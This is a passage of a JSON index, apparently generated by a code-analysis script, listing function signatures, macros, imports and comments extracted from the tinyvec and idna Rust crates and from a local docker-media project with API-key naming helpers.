          "const INVOKED_ELEM_COUNT: usize = 0 $( + { let _ = stringify!($elem); 1 })*;",
          "f($crate::array_vec!($array_type => $($elem),*))",
          "f(vec!($($elem),*))",
          "$crate::tiny_vec!(_ => $($elem),*)",
          "$crate::tiny_vec!(_)",
          "/// let empty_tv = tiny_vec!([u8; 16]);",
          "/// let some_ints = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// let mut tv = tiny_vec!([i32; 2] => 1, 2, 3);",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.is_inline());",
          "debug_assert!(rest.next().is_none());",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert!(tv.is_inline());",
          "/// assert!(tv.is_heap());",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert!(tv.is_inline());",
          "/// assert_eq!(Ok(()), tv.try_move_to_the_heap());",
          "/// assert!(tv.is_heap());",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert!(tv.is_inline());",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 35);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert!(tv.is_inline());",
          "/// assert_eq!(Ok(()), tv.try_move_to_the_heap_and_reserve(32));",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 35);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3, 4);",
          "/// assert!(tv.is_inline());",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 5);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3, 4);",
          "/// assert!(tv.is_inline());",
          "/// assert_eq!(Ok(()), tv.try_reserve(1));",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 5);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3, 4);",
          "/// assert!(tv.is_inline());",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 5);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3, 4);",
          "/// assert!(tv.is_inline());",
          "/// assert_eq!(Ok(()), tv.try_reserve_exact(1));",
          "/// assert!(tv.is_heap());",
          "/// assert!(tv.capacity() >= 5);",
          "/// assert!(t.is_inline());",
          "/// assert!(t.capacity() >= 5);",
          "/// assert!(t.is_heap());",
          "/// assert!(t.capacity() >= 20);",
          "/// assert!(v.is_heap());",
          "/// assert_eq!(mem_size_of(&v), 136); // mem size of TinyVec<[u8; N]>: N+8",
          "/// assert_eq!(v.len(), 256);",
          "/// assert_eq!(mem_size_of(&boxed), 16); // mem size of Box<[u8]>: 16 bytes (fat",
          "/// assert_eq!(boxed.len(), 256);",
          "/// assert_eq!(vec, vec2);",
          "/// let mut tv = tiny_vec!([&str; 4] => \"foo\", \"bar\", \"quack\", \"zap\");",
          "/// assert_eq!(tv.swap_remove(1), \"bar\");",
          "/// assert_eq!(tv.as_slice(), &[\"foo\", \"zap\", \"quack\"][..]);",
          "/// assert_eq!(tv.swap_remove(0), \"foo\");",
          "/// assert_eq!(tv.as_slice(), &[\"quack\", \"zap\"][..]);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(tv.remove(1), 2);",
          "/// assert_eq!(tv.as_slice(), &[1, 3][..]);",
          "/// let mut tv = tiny_vec!([i32; 10] => 1, 2, 3, 4);",
          "/// assert_eq!(tv.as_slice(), &[2, 4][..]);",
          "/// let mut tv = tiny_vec!([i32; 10] => 1, 2, 3, 4);",
          "/// assert_eq!(tv.as_slice(), &[4, 8][..]);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(tv.as_slice(), &[1][..]);",
          "/// assert_eq!(tv2.as_slice(), &[2, 3][..]);",
          "/// assert_eq!(tv.as_slice(), &[]);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2);",
          "/// assert_eq!(tv.as_slice(), [1, 2, 3, 4]);",
          "panic!(\"TinyVec: length {} exceeds capacity {}!\", len, A::CAPACITY)",
          "/// let mut tv = tiny_vec!([i32; 10] => 1, 2, 3);",
          "/// assert_eq!(tv.as_slice(), &[1, 4, 2, 3]);",
          "/// assert_eq!(tv.as_slice(), &[1, 4, 2, 3, 5]);",
          "assert!(",
          "/// let mut tv = tiny_vec!([&str; 10] => \"hello\");",
          "/// assert_eq!(tv.as_slice(), &[\"hello\", \"world\", \"world\"][..]);",
          "/// let mut tv = tiny_vec!([i32; 10] => 1, 2, 3, 4);",
          "/// assert_eq!(tv.as_slice(), &[1, 2][..]);",
          "/// let mut tv = tiny_vec!([i32; 3] => 1, 2, 3);",
          "/// assert_eq!(tv.as_slice(), &[1, 2, 3, 0, 0][..]);",
          "/// let mut tv = tiny_vec!([i32; 2]);",
          "/// assert_eq!(tv.as_slice(), &[2, 4, 8, 16][..]);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(tv.as_slice(), &[1][..]);",
          "/// assert_eq!(tv2.as_slice(), &[2, 3][..]);",
          "/// let mut tv = tiny_vec!([i32; 4] => 1, 2, 3);",
          "/// assert_eq!(tv.as_slice(), &[1, 4, 5, 6][..]);",
          "/// assert_eq!(tv2.as_slice(), &[2, 3][..]);",
          "/// assert_eq!(tv.as_slice(), &[]);",
          "assert!(",
          "assert!(",
          "/// assert_eq!(mem_size_of(&v), 136);",
          "/// assert_eq!(mem_size_of(&vec), 24);",
          "/// assert_eq!(v.len(), 128);",
          "/// assert_eq!(mem_size_of(&v), 24);",
          "/// assert!(type_of(&v).ends_with(\"TinyVec<[u8; 1]>\"));",
          "/// assert_eq!(mem_size_of(&vec), 24);",
          "/// assert!(type_of(&vec).ends_with(\"Vec<u8>\"));",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")"
        ],
        "derives": [],
        "error_handling": 93
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/slicevec.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn deref(&self) -> &Self::Target {",
          "fn deref_mut(&mut self) -> &mut Self::Target {",
          "fn index(&self, index: I) -> &Self::Output {",
          "fn index_mut(&mut self, index: I) -> &mut Self::Output {",
          "fn drop(&mut self) {",
          "fn from(data: &'s mut [T]) -> Self {",
          "fn from(a: &'s mut A) -> Self {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn drop(&mut self) {",
          "fn as_mut(&mut self) -> &mut [T] {",
          "fn as_ref(&self) -> &[T] {",
          "fn borrow(&self) -> &[T] {",
          "fn borrow_mut(&mut self) -> &mut [T] {",
          "fn extend<I: IntoIterator<Item = T>>(&mut self, iter: I) {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn partial_cmp(&self, other: &Self) -> Option<core::cmp::Ordering> {",
          "fn cmp(&self, other: &Self) -> core::cmp::Ordering {",
          "fn eq(&self, other: &&[T]) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn write_str(&mut self, s: &str) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {",
          "fn fmt(&self, f: &mut Formatter) -> core::fmt::Result {"
        ],
        "struct_defs": [
          "struct JoinOnDrop<'vec, Item> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use super::*;",
          "use core::ops::Bound;"
        ],
        "macros": [
          "/// assert_eq!(sv.as_slice(), &[6][..]);",
          "/// assert_eq!(drained_values.as_slice(), &[7, 8][..]);",
          "/// assert_eq!(sv.as_slice(), &[]);",
          "assert!(",
          "assert!(",
          "panic!(",
          "/// assert_eq!(&sv[..], [0, 1, 2, 3]);",
          "/// assert_eq!(to_inf.next(), Some(4));",
          "assert!(len <= data.len());",
          "/// assert_eq!(sv.as_slice(), &[1, 4, 2, 3]);",
          "/// assert_eq!(sv.as_slice(), &[1, 4, 2, 3, 5]);",
          "panic!(\"SliceVec::insert> index {} is out of bounds {}\", index, self.len);",
          "/// assert_eq!(sv.pop(), Some(2));",
          "/// assert_eq!(sv.pop(), Some(1));",
          "/// assert_eq!(sv.pop(), None);",
          "/// assert_eq!(&sv[..], []);",
          "/// assert_eq!(&sv[..], [1]);",
          "/// assert_eq!(&sv[..], [1, 2]);",
          "panic!(\"SliceVec::push> capacity overflow\")",
          "/// assert_eq!(sv.remove(1), 2);",
          "/// assert_eq!(&sv[..], [1, 3]);",
          "/// assert_eq!(&sv[..], [\"hello\", \"world\", \"world\"]);",
          "/// assert_eq!(&sv[..], ['a', 'b']);",
          "/// assert_eq!(&sv[..], [1, 2, 3, 0, 0]);",
          "/// assert_eq!(&sv[..], [2, 4, 8, 16]);",
          "/// assert_eq!(&sv[..], [2, 4]);",
          "panic!(",
          "/// assert_eq!(&sv[..], [1]);",
          "/// assert_eq!(&sv2[..], [2, 3]);",
          "/// assert_eq!(sv.swap_remove(1), \"bar\");",
          "/// assert_eq!(&sv[..], [\"foo\", \"zap\", \"quack\"]);",
          "/// assert_eq!(sv.swap_remove(0), \"foo\");",
          "/// assert_eq!(&sv[..], [\"quack\", \"zap\"]);",
          "assert!(",
          "/// assert_eq!(sv.grab_spare_slice().len(), 4);",
          "/// assert_eq!(sv.grab_spare_slice().len(), 0);",
          "/// assert_eq!(sv.grab_spare_slice_mut().len(), 4);",
          "/// assert_eq!(sv.grab_spare_slice_mut().len(), 2);",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")",
          "write!(f, \"[\")?;",
          "write!(f, \"\\n    \")?;",
          "write!(f, \",{}\", if f.alternate() { \"\\n    \" } else { \" \" })?;",
          "write!(f, \",\\n\")?;",
          "write!(f, \"]\")"
        ],
        "derives": [],
        "error_handling": 50
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/array.rs",
        "function_defs": [
          "fn as_slice(&self) -> &[Self::Item];",
          "fn as_slice_mut(&mut self) -> &mut [Self::Item];",
          "fn default() -> Self;"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/array/generic_array_impl.rs",
        "function_defs": [
          "fn as_slice(&self) -> &[T] {",
          "fn as_slice_mut(&mut self) -> &mut [T] {",
          "fn default() -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::default;",
          "use super::Array;",
          "use generic_array::{ArrayLength, GenericArray};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/src/array/const_generic_impl.rs",
        "function_defs": [
          "fn as_slice(&self) -> &[T] {",
          "fn as_slice_mut(&mut self) -> &mut [T] {",
          "fn default() -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::Array;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0",
    "name": "idna-0.3.0",
    "languages": [
      "Rust",
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/src/make_uts46_mapping_table.py",
        "docstrings": [],
        "function_defs": [
          "def escape_char(c):",
          "def char(s):",
          "def strtab_slice(s):",
          "def rust_slice(s):",
          "def mergeable_key(r):",
          "def is_single_char_range(r):",
          "def merge_single_char_ranges(ranges):",
          "def escape_str(s):"
        ],
        "class_defs": [],
        "imports": [
          "import collections",
          "import itertools"
        ],
        "comments": [
          "# Copyright 2013-2014 The rust-url developers.",
          "#",
          "# Licensed under the Apache License, Version 2.0 <LICENSE-APACHE or",
          "# http://www.apache.org/licenses/LICENSE-2.0> or the MIT license",
          "# <LICENSE-MIT or http://opensource.org/licenses/MIT>, at your",
          "# option. This file may not be copied, modified, or distributed",
          "# except according to those terms.",
          "# Run as: python make_uts46_mapping_table.py IdnaMappingTable.txt > uts46_mapping_table.rs",
          "# You can get the latest idna table from",
          "# http://www.unicode.org/Public/idna/latest/IdnaMappingTable.txt",
          "# remove comments",
          "# skip empty lines",
          "# These types have associated data, so we should not merge them.",
          "# Assert that nothing in the group has an associated unicode string.",
          "# Assert that consecutive members of the group don't leave gaps in",
          "# the codepoint space.",
          "# There's a gap where surrogates would appear, but we don't have to",
          "# worry about that gap, as surrogates never appear in Rust strings.",
          "# Assert we're seeing the surrogate case here.",
          "# We can reduce the size of the character range table and the index table to about 1/4",
          "# by merging runs of single character ranges and using character offsets from the start",
          "# of that range to retrieve the correct `Mapping` value"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/tests/punycode.rs",
        "function_defs": [
          "fn one_test(decoded: &str, encoded: &str) {",
          "fn get_string<'a>(map: &'a Map<String, Value>, key: &str) -> &'a str {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::test::TestFn;",
          "use idna::punycode::{decode, encode_str};",
          "use serde_json::map::Map;",
          "use serde_json::Value;",
          "use std::str::FromStr;"
        ],
        "macros": [
          "None => panic!(\"Decoding {} failed.\", encoded),",
          "assert!(",
          "None => panic!(\"Encoding {} failed.\", decoded),",
          "Some(result) => assert!(",
          "_ => panic!(),",
          "match Value::from_str(include_str!(\"punycode_tests.json\")) {",
          "format!(\"Punycode {}\", i + 1)",
          "format!(\"Punycode {}: {}\", i + 1, desc)",
          "_ => panic!(),",
          "other => panic!(\"{:?}\", other),"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/tests/uts46.rs",
        "function_defs": [
          "fn check<F>(source: &str, expected: (&str, &[&str]), actual: Result<String, Errors>, ignore: F)",
          "fn unescape(input: &str) -> String {",
          "fn status(status: &str) -> Vec<&str> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::test::TestFn;",
          "use std::char;",
          "use std::fmt::Write;",
          "use idna::Errors;"
        ],
        "macros": [
          "for (i, line) in include_str!(\"IdnaTestV2.txt\").lines().enumerate() {",
          "let test_name = format!(\"UTS #46 line {}\", i + 1);",
          "assert_eq!(",
          "assert!(",
          "assert_eq!(actual.unwrap(), expected.0, \"source: {}\", source);",
          "write!(&mut output, \"\\\\u{:X}{:X}{:X}{:X}\", c1, c2, c3, c4)",
          "_ => panic!(\"Invalid test data input\"),",
          "assert!(result[0].starts_with('['));",
          "assert!(last.ends_with(']'));"
        ],
        "derives": [],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/tests/tests.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use tester as test;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/tests/unit.rs",
        "function_defs": [
          "fn test_punycode_prefix_with_length_check() {",
          "fn test_punycode_prefix_without_length_check() {",
          "fn test_examples() {",
          "fn test_v5() {",
          "fn test_v8_bidi_rules() {",
          "fn emoji_domains() {",
          "fn unicode_before_delimiter() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use assert_matches::assert_matches;",
          "use unicode_normalization::char::is_combining_mark;"
        ],
        "macros": [
          "assert!(config.to_ascii(\"xn--\").is_err());",
          "assert!(config.to_ascii(\"xn---\").is_err());",
          "assert!(config.to_ascii(\"xn-----\").is_err());",
          "assert!(config.to_ascii(\"xn--.\").is_err());",
          "assert!(config.to_ascii(\"xn--...\").is_err());",
          "assert!(config.to_ascii(\".xn--\").is_err());",
          "assert!(config.to_ascii(\"...xn--\").is_err());",
          "assert!(config.to_ascii(\"xn--.xn--\").is_err());",
          "assert!(config.to_ascii(\"xn--.example.org\").is_err());",
          "assert_eq!(config.to_ascii(\"xn--\").unwrap(), \"\");",
          "assert!(config.to_ascii(\"xn---\").is_err());",
          "assert!(config.to_ascii(\"xn-----\").is_err());",
          "assert_eq!(config.to_ascii(\"xn--.\").unwrap(), \".\");",
          "assert_eq!(config.to_ascii(\"xn--...\").unwrap(), \"...\");",
          "assert_eq!(config.to_ascii(\".xn--\").unwrap(), \".\");",
          "assert_eq!(config.to_ascii(\"...xn--\").unwrap(), \"...\");",
          "assert_eq!(config.to_ascii(\"xn--.xn--\").unwrap(), \".\");",
          "assert_eq!(config.to_ascii(\"xn--.example.org\").unwrap(), \".example.org\");",
          "assert_matches!(codec.to_unicode(\"Blo\u00df.de\", &mut out), Ok(()));",
          "assert_eq!(out, \"blo\u00df.de\");",
          "assert_matches!(codec.to_unicode(\"xn--blo-7ka.de\", &mut out), Ok(()));",
          "assert_eq!(out, \"blo\u00df.de\");",
          "assert_matches!(codec.to_unicode(\"u\\u{308}.com\", &mut out), Ok(()));",
          "assert_eq!(out, \"\u00fc.com\");",
          "assert_matches!(codec.to_unicode(\"xn--tda.com\", &mut out), Ok(()));",
          "assert_eq!(out, \"\u00fc.com\");",
          "assert_matches!(codec.to_unicode(\"xn--u-ccb.com\", &mut out), Err(_));",
          "assert_matches!(codec.to_unicode(\"a\u2488com\", &mut out), Err(_));",
          "assert_matches!(codec.to_unicode(\"xn--a-ecp.ru\", &mut out), Err(_));",
          "assert_matches!(codec.to_unicode(\"xn--0.pt\", &mut out), Err(_));",
          "assert_matches!(codec.to_unicode(\"\u65e5\u672c\u8a9e\u3002\uff2a\uff30\", &mut out), Ok(()));",
          "assert_eq!(out, \"\u65e5\u672c\u8a9e.jp\");",
          "assert_matches!(codec.to_unicode(\"\u2615.us\", &mut out), Ok(()));",
          "assert_eq!(out, \"\u2615.us\");",
          "assert!(is_combining_mark('\\u{11C3A}'));",
          "assert!(config.to_ascii(\"\\u{11C3A}\").is_err());",
          "assert!(config.to_ascii(\"\\u{850f}.\\u{11C3A}\").is_err());",
          "assert!(config.to_ascii(\"\\u{850f}\\u{ff61}\\u{11C3A}\").is_err());",
          "assert_eq!(config.to_ascii(\"abc\").unwrap(), \"abc\");",
          "assert_eq!(config.to_ascii(\"123\").unwrap(), \"123\");",
          "assert_eq!(config.to_ascii(\"\u05d0\u05d1\u05bc\u05d2\").unwrap(), \"xn--kdb3bdf\");",
          "assert_eq!(config.to_ascii(\"\u0627\u0628\u062c\").unwrap(), \"xn--mgbcm\");",
          "assert_eq!(config.to_ascii(\"abc.\u0627\u0628\u062c\").unwrap(), \"abc.xn--mgbcm\");",
          "assert_eq!(config.to_ascii(\"\u05d0\u05d1\u05bc\u05d2.\u0627\u0628\u062c\").unwrap(), \"xn--kdb3bdf.xn--mgbcm\");",
          "assert!(config.to_ascii(\"0a.\\u{05D0}\").is_err());",
          "assert!(config.to_ascii(\"0\u00e0.\\u{05D0}\").is_err());",
          "assert!(config.to_ascii(\"xn--0ca24w\").is_err());",
          "assert_eq!(config.to_ascii(\"\u2615.com\").unwrap(), \"xn--53h.com\");",
          "let error = format!(\"{:?}\", config.to_ascii(\"\u2615.com\").unwrap_err());",
          "assert!(error.contains(\"disallowed_in_idna_2008\"));",
          "assert!(config.to_ascii(\"xn--f\\u{34a}-PTP\").is_err());"
        ],
        "derives": [],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/benches/all.rs",
        "function_defs": [
          "fn to_unicode_puny_label(bench: &mut Bencher) {",
          "fn to_unicode_ascii(bench: &mut Bencher) {",
          "fn to_unicode_merged_label(bench: &mut Bencher) {",
          "fn to_ascii_puny_label(bench: &mut Bencher) {",
          "fn to_ascii_simple(bench: &mut Bencher) {",
          "fn to_ascii_merged(bench: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bencher::{black_box, Bencher};",
          "use idna::Config;"
        ],
        "macros": [
          "benchmark_group!(",
          "benchmark_main!(benches);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/src/uts46_mapping_table.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/src/punycode.rs",
        "function_defs": [
          "fn adapt(mut delta: u32, num_points: u32, first_time: bool) -> u32 {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn len(&self) -> usize {",
          "fn value_to_digit(value: u32) -> char {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Decoder {"
        ],
        "uses": [
          "use std::char;",
          "use std::u32;"
        ],
        "macros": [
          "_ => panic!(),"
        ],
        "derives": [
          "#[derive(Default)]"
        ],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/idna-0.3.0/src/uts46.rs",
        "function_defs": [
          "fn decode_slice(slice: &StringTableSlice) -> &'static str {",
          "fn find_char(codepoint: char) -> &'static Mapping {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn passes_bidi(label: &str, is_bidi_domain: bool) -> bool {",
          "fn check_validity(label: &str, config: Config, errors: &mut Errors) {",
          "fn is_simple(domain: &str) -> bool {",
          "fn processing(",
          "fn default() -> Self {",
          "fn is_bidi_domain(s: &str) -> bool {",
          "fn is_err(&self) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(e: Errors) -> Result<(), Errors> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn mapping_fast_path() {"
        ],
        "struct_defs": [
          "struct StringTableSlice {",
          "struct Mapper<'a> {"
        ],
        "impl_blocks": [
          "impl Idna {",
          "impl Default for Config {",
          "impl Config {",
          "impl Errors {",
          "impl fmt::Debug for Errors {",
          "impl From<Errors> for Result<(), Errors> {",
          "impl StdError for Errors {}",
          "impl fmt::Display for Errors {"
        ],
        "uses": [
          "use self::Mapping::*;",
          "use crate::punycode;",
          "use std::{error::Error as StdError, fmt};",
          "use unicode_bidi::{bidi_class, BidiClass};",
          "use unicode_normalization::char::is_combining_mark;",
          "use unicode_normalization::{is_nfc, UnicodeNormalization};",
          "use super::{find_char, Mapping};"
        ],
        "macros": [
          "include!(\"uts46_mapping_table.rs\");",
          "if !matches!(",
          "if !matches!(",
          "if matches!(",
          "assert_matches!(find_char('-'), &Mapping::Valid);",
          "assert_matches!(find_char('.'), &Mapping::Valid);",
          "assert_matches!(find_char(*c), &Mapping::Valid);",
          "assert_matches!(find_char(*c), &Mapping::Valid);"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Default)]",
          "#[derive(Clone, Copy)]",
          "#[derive(Default)]"
        ],
        "error_handling": 18
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/docker-media",
    "name": "docker-media",
    "languages": [
      "Python",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/arr_stack_constants.py",
        "docstrings": [],
        "function_defs": [
          "def keychain_service_name(service: str) -> str:\n\"\"\"Generate keychain service name for a given service.\"\"\"\nreturn f\"{KEYCHAIN_PREFIX}.{service.lower()}.apikey\"\n\ndef env_var_name(service: str) -> str:\n\"\"\"Generate environment variable name for a service.\"\"\"",
          "def env_var_name(service: str) -> str:\n\"\"\"Generate environment variable name for a service.\"\"\"\nreturn f\"{service.upper()}_API_KEY\"\n\ndef docker_service_url(service: str) -> str:\n\"\"\"Generate Docker service URL.\"\"\"",
          "def docker_service_url(service: str) -> str:\n\"\"\"Generate Docker service URL.\"\"\"\nconfig = SUPPORTED_SERVICES.get(service.lower())\nif config:\nreturn f\"http://localhost:{config['port']}\"\nreturn \"\"\n\n# Service Status Categories\nSERVICE_STATUS = {\n'configured': ['sonarr', 'radarr', 'lidarr', 'prowlarr', 'bazarr'],"
        ],
        "class_defs": [],
        "imports": [],
        "comments": [
          "# Keychain Configuration",
          "# Supported Services Configuration",
          "# Template for new services",
          "# Backwards compatibility",
          "# Docker Configuration",
          "# File Paths",
          "# Naming Conventions",
          "# Service Status Categories"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/bazarr-config-updater.py",
        "docstrings": [],
        "function_defs": [
